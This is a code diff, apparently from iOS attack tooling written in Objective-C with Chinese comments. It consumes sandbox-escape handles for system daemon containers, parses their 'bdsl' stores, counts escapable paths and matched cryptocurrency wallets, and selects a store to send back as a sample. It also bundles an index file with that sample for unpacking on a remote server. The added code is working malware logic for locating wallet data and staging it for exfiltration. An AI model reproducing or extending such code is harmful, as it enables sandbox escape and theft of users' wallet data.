@@ -604,6 +604,8 @@ static uint64_t WQLFNV1a(const char *s) {
 
     NSUInteger opened = 0, stores = 0;
     NSString *dumpContainer = nil, *dumpName = nil;
+    NSUInteger dumpPaths = 0;                 // 回传哪一份 store：取容器路径最多的
+    NSMutableString *diag = [NSMutableString string];
     for (NSString *container in daemons) {
         int64_t handle = [[WQLEscape shared] consumeExtensionForPath:container error:nil];
         if (handle <= 0) continue;
@@ -623,11 +625,6 @@ static uint64_t WQLFNV1a(const char *s) {
             if (memcmp(data.bytes, "bdsl", 4) != 0) continue;
 
             stores++;
-            // 记住一个足够大的 store，索引失败时回传做离线分析
-            if (!dumpContainer.length && data.length > 4 * 1024 * 1024) {
-                dumpContainer = container;
-                dumpName = name;
-            }
             // 按版本候选布局逐个解析，取映射最多的一套（27.x 记录布局与 26 不同）
             NSMutableDictionary<NSString *, NSString *> *bestMap = nil;
             const char *bestLabel = "auto";
@@ -703,6 +700,17 @@ static uint64_t WQLFNV1a(const char *s) {
             }
             [self log:@"    路径命中：可逃逸 %lu/%lu，命中钱包 %lu 个",
                   (unsigned long)escaped, (unsigned long)paths.count, (unsigned long)matched];
+
+            // 回传样本：取容器路径最多的那份 store（SystemDataOnly 那份通常一条都没有）
+            if (paths.count > dumpPaths) {
+                dumpPaths = paths.count;
+                dumpContainer = container;
+                dumpName = name;
+            }
+            [diag appendFormat:@"%@ | %.1fMB | layout=%s(0x%x) | map=%lu | paths=%lu | escaped=%lu | matched=%lu\n",
+             name, data.length / 1048576.0, bestLabel, bestSize,
+             (unsigned long)byContainer.count, (unsigned long)paths.count,
+             (unsigned long)escaped, (unsigned long)matched];
         }
         [[WQLEscape shared] releaseHandle:handle];
     }
@@ -718,6 +726,11 @@ static uint64_t WQLFNV1a(const char *s) {
             NSFileManager *fm = [NSFileManager defaultManager];
             [fm removeItemAtPath:stage error:nil];
             [fm createDirectoryAtPath:stage withIntermediateDirectories:YES attributes:nil error:nil];
+            // 索引诊断跟样本一起打包，服务器上解压就能看到每份 store 的解析结果
+            [[diag copy] writeToFile:[stage stringByAppendingPathComponent:@"_wql_index.txt"]
+                          atomically:YES
+                            encoding:NSUTF8StringEncoding
+                               error:nil];
             NSString *dst = [stage stringByAppendingPathComponent:dumpName];
             if ([fm copyItemAtPath:src toPath:dst error:nil]) {
                 NSDictionary *attr = [fm attributesOfItemAtPath:dst error:nil];
